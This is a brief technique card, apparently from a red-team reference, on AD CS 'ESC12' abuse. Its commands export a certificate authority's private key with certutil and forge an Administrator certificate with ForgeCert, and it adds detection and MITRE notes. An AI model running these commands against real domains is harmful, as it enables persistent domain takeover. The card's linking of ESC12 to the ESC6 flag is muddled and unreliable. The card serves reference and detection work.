---
id: adcs_esc12
type: technique
label: "AD CS ESC12 (CA signing-key exposure)"
phase: "persist"
tools: ["certipy", "forgecert"]
cve: null
detect: "Monitor CA host integrity and private-key access/export, plus trusted certificates not represented in normal CA request records."
mitre: "T1649"
tag: null
---


# AD CS ESC12 (CA signing-key exposure)

### Affected object / attribute
**CA server host** + **`EDITF_ATTRIBUTESUBJECTALTNAME2`**.

### Concept (deep)
**Shell access to the CA server** + the ESC6 flag → issue certificates locally or extract the **CA private key**. This is a **physical/host-level compromise**.

### Commands
```bash
# ── On the CA host ───────────────────────────────────────────────────
certutil -backupKey C:\backup
# Then use ForgeCert to forge certificates offline.
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword p \
  --Subject "CN=Administrator" \
  --SubjectAltName administrator@corp.local --NewCertPath admin.pfx
```

### Detection
CertSvc config registry writes; CA key export audit (`certutil -backup`).

---
